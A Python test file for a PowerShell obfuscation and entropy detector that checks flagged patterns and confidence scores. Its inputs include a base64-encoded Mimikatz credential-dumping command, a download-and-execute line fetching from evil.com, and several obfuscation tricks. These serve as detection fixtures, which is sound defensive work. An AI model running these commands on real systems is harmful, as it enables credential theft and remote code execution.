"""Tests for PowerShell obfuscation detection."""

from __future__ import annotations

import base64

from aegis.detection.powershell_analyzer import (
    ObfuscationResult,
    PowerShellAnalyzer,
)

# ================================================================== #
#  ObfuscationResult dataclass tests
# ================================================================== #


class TestObfuscationResult:
    """Tests for the ObfuscationResult dataclass."""

    def test_result_fields(self):
        result = ObfuscationResult(
            entropy=4.2,
            is_obfuscated=True,
            matched_patterns=["backtick_obfuscation"],
            confidence=0.8,
        )
        assert result.entropy == 4.2
        assert result.is_obfuscated is True
        assert result.matched_patterns == ["backtick_obfuscation"]
        assert result.confidence == 0.8

    def test_result_clean(self):
        result = ObfuscationResult(
            entropy=2.5,
            is_obfuscated=False,
            matched_patterns=[],
            confidence=0.0,
        )
        assert result.is_obfuscated is False
        assert len(result.matched_patterns) == 0

    def test_result_multiple_patterns(self):
        result = ObfuscationResult(
            entropy=5.5,
            is_obfuscated=True,
            matched_patterns=["base64_inline", "iex_invoke"],
            confidence=0.9,
        )
        assert len(result.matched_patterns) == 2


# ================================================================== #
#  Entropy analysis tests
# ================================================================== #


class TestEntropyAnalysis:
    """Tests for Shannon entropy calculation on scripts."""

    def test_clean_powershell_low_entropy(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "Get-Process | Where-Object {$_.CPU -gt 10}"
        )
        assert result.entropy < 5.0
        assert result.is_obfuscated is False

    def test_base64_encoded_high_entropy(self):
        analyzer = PowerShellAnalyzer()
        payload = base64.b64encode(
            b'Invoke-Mimikatz -DumpCreds -Command '
            b'"privilege::debug" -Verbose'
        ).decode()
        script = f"powershell -enc {payload}"
        result = analyzer.analyze(script)
        assert result.is_obfuscated is True

    def test_empty_string_zero_entropy(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("")
        assert result.entropy == 0.0
        assert result.is_obfuscated is False

    def test_single_char_repeated_low_entropy(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("aaaaaaaaaa")
        assert result.entropy == 0.0
        assert result.is_obfuscated is False

    def test_high_entropy_random_chars(self):
        analyzer = PowerShellAnalyzer()
        # Many unique characters should produce high entropy
        script = "aB3$cD7!eF1@gH9#iJ5%kL2^mN8&oP4*qR0"
        result = analyzer.analyze(script)
        assert result.entropy > 4.0


# ================================================================== #
#  Pattern detection tests
# ================================================================== #


class TestPatternDetection:
    """Tests for regex pattern matching on obfuscated scripts."""

    def test_detects_backtick_obfuscation(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("I`nv`oke-`Exp`ress`ion")
        assert "backtick_obfuscation" in result.matched_patterns

    def test_detects_string_concatenation(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "('Inv'+'oke'+'-Exp'+'ress'+'ion')"
        )
        assert "string_concat" in result.matched_patterns

    def test_detects_char_array(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "[char[]]@(73,110,118) -join ''"
        )
        assert "char_array_join" in result.matched_patterns

    def test_detects_char_array_numeric_sequence(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "@(73,110,118,111,107,101)"
        )
        assert "char_array_join" in result.matched_patterns

    def test_detects_frombase64string(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "[System.Convert]::FromBase64String('dGVzdA==')"
        )
        assert "base64_inline" in result.matched_patterns

    def test_detects_convert_frombase64(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "[Convert]::FromBase64String('dGVzdA==')"
        )
        assert "base64_inline" in result.matched_patterns

    def test_detects_encoded_command_flag(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "powershell -enc SQBuAHYAbwBrAGUA"
        )
        assert "encoded_command" in result.matched_patterns

    def test_detects_encodedcommand_long_flag(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "powershell -encodedcommand SQBuAHYAbwBrAGUA"
        )
        assert "encoded_command" in result.matched_patterns

    def test_detects_iex_alias(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "iex (New-Object Net.WebClient).DownloadString('http://evil.com')"
        )
        assert "iex_invoke" in result.matched_patterns

    def test_detects_invoke_expression(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "Invoke-Expression $encodedCmd"
        )
        assert "iex_invoke" in result.matched_patterns

    def test_detects_replace_chains(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "'obfuscated' -replace 'a','b' -replace 'c','d'"
        )
        assert "replace_deobfuscation" in result.matched_patterns

    def test_detects_deflatestream(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "New-Object IO.Compression.DeflateStream($ms, "
            "[IO.Compression.CompressionMode]::Decompress)"
        )
        assert "compress_decompress" in result.matched_patterns

    def test_detects_gzipstream(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "New-Object System.IO.Compression.GZipStream($input, "
            "[System.IO.Compression.CompressionMode]::Decompress)"
        )
        assert "compress_decompress" in result.matched_patterns

    def test_detects_io_compression_namespace(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "[IO.Compression.DeflateStream]::new($stream)"
        )
        assert "compress_decompress" in result.matched_patterns

    def test_clean_script_no_patterns(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("Get-ChildItem -Path C:\\Users")
        assert len(result.matched_patterns) == 0

    def test_clean_script_get_service(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "Get-Service | Where-Object {$_.Status -eq 'Running'}"
        )
        assert len(result.matched_patterns) == 0


# ================================================================== #
#  Obfuscation decision logic tests
# ================================================================== #


class TestObfuscationDecision:
    """Tests for the combined scoring and is_obfuscated decision."""

    def test_high_entropy_alone_triggers_obfuscated(self):
        analyzer = PowerShellAnalyzer()
        # A script with very high entropy but no patterns should
        # still be flagged if entropy > 5.0
        high_entropy = "".join(
            chr(i) for i in range(33, 127)
        )
        result = analyzer.analyze(high_entropy)
        if result.entropy > 5.0:
            assert result.is_obfuscated is True

    def test_two_patterns_trigger_obfuscated(self):
        analyzer = PowerShellAnalyzer()
        # Script with two pattern matches but potentially low entropy
        script = (
            "iex ([System.Convert]::FromBase64String('dGVzdA=='))"
        )
        result = analyzer.analyze(script)
        assert result.is_obfuscated is True
        assert len(result.matched_patterns) >= 2

    def test_single_pattern_low_entropy_not_obfuscated(self):
        analyzer = PowerShellAnalyzer()
        # Single pattern match with low entropy should NOT trigger
        result = analyzer.analyze("Invoke-Expression $cmd")
        if result.entropy < 5.0 and len(result.matched_patterns) < 2:
            assert result.is_obfuscated is False

    def test_confidence_between_0_and_1(self):
        analyzer = PowerShellAnalyzer()
        scripts = [
            "Get-Process",
            "I`nv`oke-`Exp`ress`ion",
            "iex ([Convert]::FromBase64String('dGVzdA=='))",
        ]
        for script in scripts:
            result = analyzer.analyze(script)
            assert 0.0 <= result.confidence <= 1.0

    def test_more_patterns_higher_confidence(self):
        analyzer = PowerShellAnalyzer()
        # Script with many obfuscation signals
        heavy = (
            "iex ([System.Convert]::FromBase64String("
            "('dG' + 'Vz' + 'dA==')))"
        )
        light = "Invoke-Expression $x"
        heavy_result = analyzer.analyze(heavy)
        light_result = analyzer.analyze(light)
        assert heavy_result.confidence >= light_result.confidence


# ================================================================== #
#  Backtick pattern edge cases
# ================================================================== #


class TestBacktickEdgeCases:
    """The backtick pattern should require 3+ backticks."""

    def test_single_backtick_not_detected(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("Write-Host `n")
        assert "backtick_obfuscation" not in result.matched_patterns

    def test_two_backticks_not_detected(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("Wr`ite-Ho`st")
        assert "backtick_obfuscation" not in result.matched_patterns

    def test_three_backticks_detected(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("I`nv`ok`e-Expression")
        assert "backtick_obfuscation" in result.matched_patterns


# ================================================================== #
#  Case sensitivity tests
# ================================================================== #


class TestCaseSensitivity:
    """Patterns that should be case-insensitive."""

    def test_frombase64string_case_insensitive(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "[system.convert]::frombase64string('dGVzdA==')"
        )
        assert "base64_inline" in result.matched_patterns

    def test_iex_case_insensitive(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("IEX $cmd")
        assert "iex_invoke" in result.matched_patterns

    def test_invoke_expression_mixed_case(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze("invoke-expression $cmd")
        assert "iex_invoke" in result.matched_patterns

    def test_encoded_command_uppercase(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "powershell -Enc SQBuAHYAbwBrAGUA"
        )
        assert "encoded_command" in result.matched_patterns

    def test_deflatestream_case_insensitive(self):
        analyzer = PowerShellAnalyzer()
        result = analyzer.analyze(
            "new-object io.compression.deflatestream"
        )
        assert "compress_decompress" in result.matched_patterns
